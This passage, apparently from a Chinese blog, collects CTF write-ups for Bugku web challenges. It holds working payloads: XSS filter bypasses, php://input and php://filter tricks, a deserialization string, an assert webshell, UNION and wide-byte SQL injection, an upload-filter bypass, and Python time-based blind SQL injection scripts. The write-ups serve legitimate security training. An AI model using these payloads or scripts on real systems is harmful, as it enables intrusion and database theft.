if r.text: print(r.text,end='') 结果： 1&lt;?php $key='KEY&#123;key_keys&#125;'; ?&gt; XSS注入测试网址：http://103.238.227.13:10089/ 页面提示我们要注入一段xss代码，看一下源代码 关键代码： 1234&lt;script&gt; var s=\"\"; document.getElementById('s').innerHTML = s;&lt;/script&gt; id为s的是一个为空的div标签 1&lt;div id=\"s\"&gt;&lt;/div&gt; 举个例子说明一下innerHTML 12345678&lt;a id=\"baidu\"&gt;&lt;strong&gt;百度&lt;/strong&gt;&lt;/a&gt; document.getElementById(\"baidu\") 获得 a 这个元素document.getElementById(\"baidu\") .innerHTML 获得 a 这个元素内的HTML代码（即&lt;strong&gt;百度&lt;/strong&gt;）document.getElementById(\"baidu\") .innerHTML = \"&lt;em&gt;谷歌&lt;/em&gt;\" 设置 a 这个元素内的HTML代码，设置后&lt;strong&gt;百度&lt;/strong&gt;就变为&lt;em&gt;谷歌&lt;/em&gt; 这里说明一下如果字符串中拼接的 HTML 标签中有 script 标签，那么该段脚本是无法执行的，这并不是 bug，而是 w3c 的文档规定的 再来看看这题，没有给出注入点，按照惯例是id，输入 1?id=&lt;script&gt;alert(_key_)&lt;/script&gt; 查看源代码 123&lt;script&gt; var s=\"&amp;lt;script&amp;gt;\"; document.getElementById('s').innerHTML = s;&lt;/script&gt; 发现&lt;&gt;被html编码，即被过滤了 因为页面编码为utf-8，所以可以将&lt;&gt;进行unicode编码，这样当代码被替换进去运行时，utf-8编码又会将其变回来 输入 1?id=\\u003cscript\\u003ealert(_key_)\\u003c/script\\u003e 返回： 1234&lt;script&gt; var s=\"\\u003cscript\\u003ealert('Flag:17f094325e90085b30a5ddefce34acd8')\\u003c/script\\u003e\";document.getElementById('s').innerHTML = s;&lt;/script&gt; 参考：https://blog.csdn.net/wy_97/article/details/77755098 never give up网址：http://120.24.86.145:8006/test/hello.php 页面源代码提示 1&lt;!--1p.html--&gt; 访问http://120.24.86.145:8006/test/1p.html，发现跳转到其他页面 那么访问其源代码view-source:http://120.24.86.145:8006/test/1p/html 1234567891011121314&lt;SCRIPT LANGUAGE=\"Javascript\"&gt;&lt;!--var Words =\"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E\" function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt;&lt;/SCRIPT&gt; 关键在于Words这个变量，第一行 1%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21 看起来像是被url编码过，url解码后： 12&lt;script&gt;window.location.href=&apos;http://www.bugku.com&apos;;&lt;/script&gt; &lt;!-- 后面是被注释的代码：先base64解码后url解码 12345678910111213141516171819202122if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)&#123; require(\"f4l2a3g.txt\");&#125;else&#123; print \"never never never give up !!!\";&#125; 看的出来这就是hello.php的源代码，这里出题人没有隐藏文件名，知道了文件名f4l2a3g.txt其实就可以直接访问 但是按照出题人的意思我们要绕过过滤，首先$data必须为”bugku is a nice plateform”，而$data值取决于函数file_get_contents，这里查询得知php后门技巧，利用php协议input，接收post的信息，经过函数file_get_contents就可以读取出来，所以$a=php://input，然后post字符串”bugku is a nice plateform” 接着是$id要等于0，但是代码开头如果$id为0则重定向，所以不能为0，利用php弱类型的特性可以给$id赋值0a 然后$b的检查长度大于5，正则匹配$b第一位必须为4，然而substr()检查$b第一位不能为4，自相矛盾，但是可以利用%00截断eregi函数 综上GET参数为?id=0a&amp;a=php://input&amp;b=%0012345 welcome to bugkuctf网址：http://120.24.86.145:8006/test1/ 进入页面查看源代码，发现提示了源代码 12345678910$user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; 审计后GET参数?txt=php://input，POST数据”welcome to the bugkuctf” 之后就是文件包含漏洞，提示了hint.php，我们GET参数file=php://filter/read=convert.base64-encode/resource=hint.php查看hint.php的源代码 base64解码后得hint.php源代码： 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"good\"); &#125; &#125; &#125; ?&gt; 又提示了flag.php，猜测flag就在这里面，再试试能不能读取flag.php的源代码 貌似被过滤了flag.php 那就看看index.php的源代码吧 解码后得： 123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello friend!&lt;br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; echo \"ä¸è½ç°å¨å°±ç»ä½ flagå¦\"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo \"you are not the number of bugku ! \"; &#125; ?&gt; &lt;!-- $user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; --&gt; 果然文件包含被正则匹配过滤了关键词flag，我们要得到flag就必须读取flag.php文件，怎么办呢，想起来还有hint.php的提示，它定义了一个类，类里定义了一个全局变量$file，如果类对象全局变量有设置值，则用file_get_contents函数读取 这里还有一个password参数经过反序列化函数unserialize处理，首先要了解这个函数具体的作用，来看一个例子： 12345678910&lt;?php$a = array('a'=&gt;'apple','b'=&gt;'banana','c'=&gt;40);$s = serialize($a);echo $s;$b = unserialize($s);echo '&lt;br&gt;';print_r($b);?&gt; 运行结果： 大概清楚规律了，再看本题，要给参数password赋值一个被序列化的字符串，使password成为Flag类的参数file 有点难理解，再看一个例子： 123456789101112&lt;?phpclass Flag&#123; public $file;&#125;$a = new Flag;$a -&gt; file = 'flag.php';$a = serialize($a);echo $a;?&gt; 这个例子初始化了一个Flag对象a，并赋值’flag.php’，在进行序列化，得到的值就相当于我们给password赋值一个反序列化的Flag对象 结果： 综上，我们GET参数?txt=php://input&amp;file=hint.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} POST数据welcome to the bugkuctf 成功拿到flag 附上本题参考链接：https://www.cnblogs.com/Pinging/p/8278168.html 过狗一句话网址：http://120.24.86.145:8010/ 题目给出了提示代码： 12345678&lt;?php$poc=\"a#s#s#e#r#t\"; $poc_1=explode(\"#\",$poc);$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']);?&gt; 用assert语句执行任意命令 输入?s=print_r(scandir(‘./‘)) 扫描当前目前下所有文件 访问http://120.24.86.145:8010/f94lag.txt 获得flag 字符？正则？网址：http://120.24.86.145:8002/web10/ 代码审计题，代码如下： 12345678&lt;?php highlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match(\"/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match);if( $IM )&#123; die('key is: '.$key);&#125;?&gt; 匹配正则输出flag值 [:punct:]指任意标点符号 输入?id=keykeykkkkkey:/k/keyk. 获得flag 前女友(SKCTF)网址：http://118.89.219.210:49162/ 页面源代码给了提示链接 链接是一个code.txt文件，里面给出了提示代码： 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; 审计代码，熟悉的值不等，md5值相等，240610708和QNKCDZO 还要绕过strcmp，我们知道strcmp比较两个字符串相等时返回0，否则返回大于0或者小于0，我们要输出flag，必须让strcmp返回0，但是strcmp不能处理数组，会返回NULL 所以输入：?v1=240610708&amp;v2=QNKCDZO&amp;v3[] 拿到flag login1(SKCTF)网址：http://118.89.219.210:49163/ 一个登陆系统，包含了登陆界面和注册界面，注册用户后登陆发现要管理员账号才能看到flag 尝试了万能密码等等都不行，猜测是用了mysql_real_escape函数过滤用户输入，怎么办呢，题目给了提示，sql约束攻击，攻击原理我写在了另一篇文章里，这里就直接给出解题过程 猜测管理员账号是admin，因为注册admin账号，提示admin账号已经存在 注册账号admin 1，(尽量多一点空格)密码自行设置 注册成功来到登录界面，输入账号admin,密码是自行设置的那个密码 拿到flag，不行的话注册admin后面的空格再延长一点应该就可以了 你从哪里来网址：http://120.24.86.145:9009/from.php 什么都没有提示，源代码也只有一句话，are you from google 猜测要从google访问到该页面才能拿到flag 想起来http请求头的Referer字段值就代表从哪个页面访问到该页面 尝试一下，用burp抓包，在请求头位置添加一行Referer: https://www.google.com 果然，拿到了flag md5 collision(NUPT_CTF)网址：http://120.24.86.145:9009/md5.php md5碰撞，源代码应该是这样的： 123456789101112131415161718&lt;?php $md51 = md5('QNKCDZO'); $a = @$_GET['a']; $md52 = @md5($a); if(isset($a))&#123; if($a != 'QNKCDZO' &amp;&amp; $md51 == $md52)&#123; echo \"nctf&#123;***&#125;\"; &#125; else&#123; echo \"false!!!\"; &#125; &#125; else&#123; echo \"please input a\"; &#125; ?&gt; php在比较0e开头的字符串时会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0 附上md5加密后以0e开头的字符串 1234567891011121314151617181920212223QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514 输入?a=s878926199a 得到flag 程序员本地网站网址：http://120.24.86.145:8002/localhost/ 题目给出提示要我们从本地访问，用burp抓包添加Referer:http://127.0.0.1，失败 想起头部还有一个字段X-Forwarded-For，代表了来源ip地址，添加X-Forwarded-For:127.0.0.1 获得flag 各种绕过网址：http://120.24.86.145:8002/web7/ 一道代码审计题 123456789101112131415161718&lt;?php highlight_file('flag.php'); $_GET['id'] = urldecode($_GET['id']); $flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'; if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!'; &#125; 要求我们POST请求提交变量passwd和GET请求提交变量id和变量uname 变量uname和passwd不能相等但是两者sha1加密后完全相等，我们md5和sha1处理数组会返回NULL，且NULL===NULL，id的话让它等于’margin’就行，url解码还是原来的 附上payload 拿到flag web8网址：http://120.24.86.145:8002/web8/ 代码审计题 123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo \"&lt;p&gt;This is flag:\" .\" $flag&lt;/p&gt;\";&#125;else&#123;echo \"&lt;p&gt;sorry!&lt;/p&gt;\";&#125;&#125;?&gt; extract函数作用是将数组里的键名取出作为新的变量名，键名对应的键值赋值给响应的变量值 也就是说我们GET的参数ac和fn的值就是变量ac和变量fn的值，题目要求变量ac和变量f完全相等，变量f是变量fn经过file_get_contents得到的值，我们可以利用php://input，让file_get_contents读取字节流 payloads如下 拿到flag 细心网址：http://120.24.86.145:8002/web13/ 看到提示：想办法变成admin，大概是要以管理员身份访问之类的 页面伪造了404页面，两个链接也没有什么提示作用，尝试一下访问robots.txt 发现文件resusl.php 访问 发现下面有提示了一行代码 1if ($_GET[x]==$password) 大概要我们GET一个参数x，要等于变量password的值，想起来刚开始的提示变成admin，就试了一下GET?x=admin 拿到了flag 求getshell网址：http://120.24.86.145:8002/web9/ 需要我们上传一个图片文件，上传php文件提示 用burp抓包修改文件类型为图片类型，依然上传失败 猜测是对文件名和文件类型都有检查，想了很久不知道怎么做 看了别人的题解，发现要对Content-Type: multipart/form-data修改为Content-Type: Multipart/form-data 绕过过滤，再将文件名修改为php5(php的别名)，只有这个没有被过滤，再将文件类型修改为图片类型 具体为什么要这么做，找了好多文章都没有解释原因，暂时当成一个技巧记下来吧 INSERT INTO注入网址：http://120.24.86.145:8002/web15/ 给出了源码提示： 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0);function getIp()&#123;$ip = '';if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123;$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;else&#123;$ip = $_SERVER['REMOTE_ADDR'];&#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host=\"localhost\";$user=\"\";$pass=\"\";$db=\"\";$connect = mysql_connect($host, $user, $pass) or die(\"Unable to connect\");mysql_select_db($db) or die(\"Unable to select database\");$ip = getIp();echo 'your ip is :'.$ip;$sql=\"insert into client_ip (ip) values ('$ip')\";mysql_query($sql);?&gt; 过滤了逗号，并且是insert 注入 我们先来看一下insert注入方法，没有报错，没有查询，只能延时注入 有延迟，可以延时注入 可是过滤了逗号，就没办法用if语句了 但是还有一种判断执行语句：select case when 判断条件 then 执行语句1 else 执行语句2 end ok，成功延时，那么最后考虑注入的判断条件，正常来说是用substr函数一位一位的截取判断，但是我们之前实用的substr函数也都是需要用到逗号的，怎么办呢 get了另外一种substr函数的使用方法：substr(database() from 1 for 1) = substr(database(),1,1) 接下来只需要写个脚本注入就可以了 先注出数据库名： 123456789101112131415161718192021222324import requestsurl = 'http://120.24.86.145:8002/web15/'allString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''database = ''flag = 1for i in range(1,10): for j in allString: header = &#123; \"X-Forwarded-For\":\"1'+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#\"%(i,ord(j)) &#125; r = requests.get(url,headers=header) t = r.elapsed.total_seconds() print('the time of '+j+' is '+str(t)) if t &gt;= 3: database = database + j print('the '+str(i)+' place of database is '+j) break elif t &lt; 3 and j == 'M': flag = 0 break if flag == 0 : breakprint('database:',database) 结果： 数据名为web15 注表名： 123456789101112131415161718192021222324import requestsurl = 'http://120.24.86.145:8002/web15/'allString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''table_name = ''flag = 1for i in range(1,20): for j in allString: header = &#123; \"X-Forwarded-For\":\"1'+(select case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))=%d) then sleep(3) else 0 end))#\"%(i,ord(j)) &#125; r = requests.get(url,headers=header) t = r.elapsed.total_seconds() print('the time of '+j+' is '+str(t)) if t &gt;= 3 and t &lt; 4: table_name = table_name + j print('the '+str(i)+' place of table_name is '+j) break elif t &lt; 3 and j == 'M': flag = 0 break if flag == 0 : breakprint('table_name:',table_name) 这里需要考虑一下服务器有可能自身会延迟，所以我将延迟定在3秒到4秒内 结果： 表名：client_ip,flag 注flag表下的列名： 123456789101112131415161718192021222324import requestsurl = 'http://120.24.86.145:8002/web15/'allString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''column_name = ''flag = 1for i in range(1,20): for j in allString: header = &#123; \"X-Forwarded-For\":\"1'+(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag') from %d for 1))=%d) then sleep(3) else 0 end))#\"%(i,ord(j)) &#125; r = requests.get(url,headers=header) t = r.elapsed.total_seconds() print('the time of '+j+' is '+str(t)) if t &gt;= 3 and t &lt; 4: column_name = column_name + j print('the '+str(i)+' place of table_name is '+j) break elif t &lt; 3 and j == 'M': flag = 0 break if flag == 0 : breakprint('column_name:',column_name) 结果： 列名为flag 最后注出flag列下的信息 123456789101112131415161718192021222324import requestsurl = 'http://120.24.86.145:8002/web15/'allString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''flag = ''f = 1for i in range(1,30): for j in allString: header = &#123; \"X-Forwarded-For\":\"1'+(select case when (ascii(substr((select flag from flag) from %d for 1))=%d) then sleep(3) else 0 end))#\"%(i,ord(j)) &#125; r = requests.get(url,headers=header) t = r.elapsed.total_seconds() print('the time of '+j+' is '+str(t)) if t &gt;= 3 and t &lt; 4: flag = flag + j print('the '+str(i)+' place of table_name is '+j) break elif t &lt; 3 and j == 'M': f = 0 break if f == 0 : breakprint('flag:',flag) 最后的flag","categories":[{"name":"Bugkuctf-Web","slug":"Bugkuctf-Web","permalink":"https://Foxgrin.github.io/categories/Bugkuctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"Bugkuctf-Web(1)","slug":"Bugkuctf-Web(1)","date":"2018-07-31T07:58:00.000Z","updated":"2018-08-02T14:12:55.093Z","comments":true,"path":"/posts/38711/","link":"","permalink":"https://Foxgrin.github.io/posts/38711/","excerpt":"Bugkuctf中的Web题解(一)","text":"Bugkuctf中的Web题解(一) web2网址：http://120.24.86.145:8002/web2/ 页面提示听说聪明人都能找到答案，进去页面一堆滑稽表情，看一下源代码，就可以拿到flag 文件上传测试网址：http://103.238.227.13:10085/ 这是一个文件上传的页面，要求我们上传一个php文件，文件大小不得超过1M 我们随便上传一个php文件试试 提示上传的不是图片文件 我们再试着上传一个图片文件 又提示我们不是PHP文件 这很明显自相矛盾了，我们再看看提示，一定要上传一个php文件才可能拿到flag 利用burp分别抓取上传php文件和图片的包 试着将上传php文件的文件格式修改为图片的文件格式 意外发现拿到了flag 再试着将上传png文件的文件后缀更改为php后缀 也同样拿到了flag 所以猜测这题后台应该首先对文件类型进行检测，如果不是图片的类型，则输出”非图片文件” 如果是图片类型，再检测文件名，如果是php文件，则输出flag，不是则输出”非php文件” 因此猜测后台代码如下： 123456789101112131415&lt;?phpif(isset($_POST[&apos;Submit&apos;]))&#123; if($_FILES[&apos;file&apos;][&apos;type&apos;] !== &apos;image/png&apos;)&#123; die(&apos;not png file&apos;); &#125; if(!preg_match(&quot;/\\.php/&quot;,$_FILES[&apos;file&apos;][&apos;name&apos;]))&#123; die(&apos;not PHP file&apos;); &#125; else&#123; die(&apos;flag:xxx&apos;); &#125;&#125;?&gt; 计算器网址：http://120.24.86.145:8002/yanzhengma/ 一道计算题，貌似提交正确答案就能获得flag，但是限制了输入文本框的长度，修改源代码的输入长度，输入正确答案，即可得到flag web基础$_GET网址：http://120.24.86.145:8002/get/ 代码如下： 1234567891011&lt;?php if(isset($_GET['what']))&#123; $what = $_GET['what']; echo $what; if($what == 'flag')&#123; echo 'flag&#123;***&#125;'; &#125; &#125; ?&gt; 浏览器通过GET方式请求，提交给服务器一个what参数，如果值为flag，则输出flag值 web基础$_POST网址：http://120.24.86.145:8002/post/ 代码如下： 1234567891011&lt;?php if(isset($_POST['what']))&#123; $what = $_GET['what']; echo $what; if($what == 'flag')&#123; echo 'flag&#123;***&#125;'; &#125; &#125; ?&gt; 浏览器通过POST方式请求，提交给服务器一个what参数，如果值为flag，则输出flag值 123456789&gt;&gt;&gt; import requests&gt;&gt;&gt; url = 'http://120.24.86.145:8002/post/'&gt;&gt;&gt; data =&#123; 'what':'flag' &#125;&gt;&gt;&gt; r = requests.post(url,data=data)&gt;&gt;&gt; r.text\"$what=$_POST['what'];&lt;br&gt;\\r\\necho $what;&lt;br&gt;\\r\\nif($what=='flag')&lt;br&gt;\\r\\necho 'flag&#123;****&#125;';&lt;br&gt;\\r\\n\\r\\n\\r\\nflagflag&#123;bugku_get_ssseint67se&#125;\"&gt;&gt;&gt; 矛盾网址：http://120.24.86.145:8002/get/index1.php 源代码如下： 12345678910111213&lt;?php if(isset($_GET['num']))&#123; $num = $_GET['num']; if(!is_numeric($num))&#123; echo $num; if($num == 1)&#123; echo 'flag&#123;xxx&#125;'; &#125; &#125; &#125; ?&gt; GET请求向服务器提交的参数num值不能是单纯由数字组成的字符串，且参数num值必须等于1，才能拿到flag，看似前后自相矛盾，但是php是门弱类型语言，字符串与数字进行比较时，会截取字符串的前面数字部分与整形数字进行比较，例如我们输入参数num值为1a，会截取a前面的1作为整形与整形1比较，所以输入1a即可拿到flag web3网址：http://120.24.86.145:8002/web3/ 一直不停地弹窗，直接查看源代码 发现一串加密的东西，拿去html解码 得到KEY{J2sa42ahJK-HS11III} sql注入网址：http://103.238.227.13:10083/ 从页面提示来看，注入点是id，是数字型注入 输入id=0,id=1，返回的都是id为1的key值 输入id=1’，id=1”,都没有报错，依然都返回id=1的结果，查看一些源代码 发现编码方式是gbk，猜测可能存在宽字节注入 输入id=1%df%27 出现了报错 说明了存在宽字节注入，也说明了id被单引号包裹 有报错，有返回信息，可以考虑用union联合注入 先爆出查询字段数 输入id=1%df%27 order by 2 %23，正确返回查询结果 输入id=1%df%27 order by 3 %23，出现了报错 所以查询字段数为2，那么我们前面已经知道了输入id=2时查询结果为空 我们先爆库，输入id=2%df%27 union select database(),2%23 当前库名为sql5 再爆当前库下的表名，输入id=2%df%27 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()%23 sql5库下的表名为key,test 题目又有提示查询的是key表 那么我们就继续爆key表下的列名，输入id=2%df%27 union select group_concat(column_name),2 from information_schema.columns where table_name=’key’%23 这里出现了报错，发现是单引号被转义了，因此我们可以将字符串key转化成十六进制 得到了key表下的列名为id和string 那么查询id列和string列的值 输入id=2%df%27 union select group_concat(id),group_concat(string) from key%23 54f3320dc261f313ba712eb3f13a1f6d 即为flag值 域名解析根据提示，将 flag.bugku.com 解析到120.24.86.145 就能拿到flag 在hosts文件最末尾添加一行 120.24.86.145 flag.bugku.com 然后在浏览器输入flag.bugku.com，就可以看到flag sql注入1网址：http://103.238.227.13:10087/ 页面给出了关键的代码： 123456789101112$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit('包含敏感关键字！'.$value); &#125;&#125;$id = strip_tags($id);$query = \"SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1\"; 过滤了一些注入关键词，但是id又经过了strip_tags函数的处理，这个函数可以过滤html标签 所以，在过滤的关键词中加入&lt;&gt;即可绕过过滤 从源代码看注入点是id，没有被引号包裹 输入id=1’，没有查询结果，也没报错，说明这里没有显示报错信息，不能用报错注入，但依然可以用联合注入 还是先爆查询字段数，输入id=1 o&lt;&gt;rder by 2%23，正确返回结果 输入id=1 o&lt;&gt;rder by 3%23,没有返回结果，说明查询字段数为2 接下来爆库，输入id=2 u&lt;&gt;nion s&lt;&gt;elect database(),2%23 当前库名为sql3 爆sql3库下的表名，输入id=2 u&lt;&gt;nion s&lt;&gt;elect group_concat(t&lt;&gt;able_name),2 f&lt;&gt;rom info&lt;&gt;rmation_schema.t&lt;&gt;ables where t&lt;&gt;able_schema=database()%23 sql3库下的表名为hash,key,temp 爆key表下的列名，输入id=2 u&lt;&gt;nion s&lt;&gt;elect group_concat(column_name),2 f&lt;&gt;rom info&lt;&gt;rmation_schema.columns where t&lt;&gt;able_name=’key’%23 hash表的列名为id,hash 爆id,hash列的值，输入id=2 u&lt;&gt;nion s&lt;&gt;elect group_concat(id),group_concat(hash) f&lt;&gt;rom sql3.key%23 flag：c3d3c17b4ca7f791f85e#$1cc72af274af4adef 你必须让它停下网址：http://120.24.86.145:8002/web12/ 进去页面后发现一直不停地在刷新，看一下源代码 123456&lt;script language=\"JavaScript\"&gt;function myrefresh()&#123;window.location.reload();&#125;setTimeout('myrefresh()',500); &lt;/script&gt; 这里定义了一个函数myrefresh，语句window.location.reload()作用是刷新一次页面，再用setTimeout方法定时刷新一次页面，我们用burp拦截下每次请求的包，发现每次响应的图片都不一样 于是用burp的intruder模块发送100次请求报文 发现其中有个响应报文长度比其他都长，查看响应内容，发现flag 本地包含网址：http://120.24.86.145:8003/ 源代码： 123456 &lt;?php include \"flag.php\"; $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source(__FILE__); ?&gt; REQUEST包含了POST和GET，我们通过提交给服务器一个参数hello，服务器利用eval函数执行hello的值的内容，很明显存在命令执行的漏洞，我们可以通过闭合符号的方法去执行多条命令，将flag.php文件内容读取出来 我们输入hello=1);print_r(file(‘./flag.php’) 这样将相当于形成语句eval(“var_dump(hellp=1);print_r(file(‘./flag.php’));”) 执行了多条命令 当然也可以直接输入hello=print_r(file(‘./flag.php’)) 都可以读出flag 变量1网址：http://120.24.86.145:8004/index1.php 源代码： 1234567891011121314&lt;?php error_reporting(0);include \"flag1.php\";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match(\"/^\\w+$/\",$args))&#123; die(\"args error!\"); &#125; eval(\"var_dump($$args);\");&#125;?&gt; 跟上一题有点像，用到了正则匹配，参数args值必须是由[A-Za-z0-9]字符集组成，并且将args值作为新的变量输出然后eval函数执行 根据题目的提示，flag值是一个变量，然而这个变量并不在我们访问的php文件中有定义，所以我们可以猜测flag可能是一个全局变量，php的全局变量是$GLOBALS，所以可以给参数args赋值GLOBALS，就可以将全局变量输出出来 果然，flag就在里面 Web5网址：http://120.24.86.145:8002/web5/ 看起来要提交一个表单 看一下源代码 发现一个隐藏的一串代码 查询知道这是一串JSFuck代码，是将js代码编译生成的一串长代码 放到http://www.bugku.com/tools/jsfuck/解码得到 头等舱网址：http://120.24.86.145:9009/hd.php 访问页面发现什么也没有，源代码也看不出什么 试着用burp抓包 在响应头部发现flag值 Web4网址：http://120.24.86.145:8002/web4/ 网页提示我们看一下源代码 发现一串被url加密的js代码 12345&lt;script&gt;var p1 = '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';var p2 = 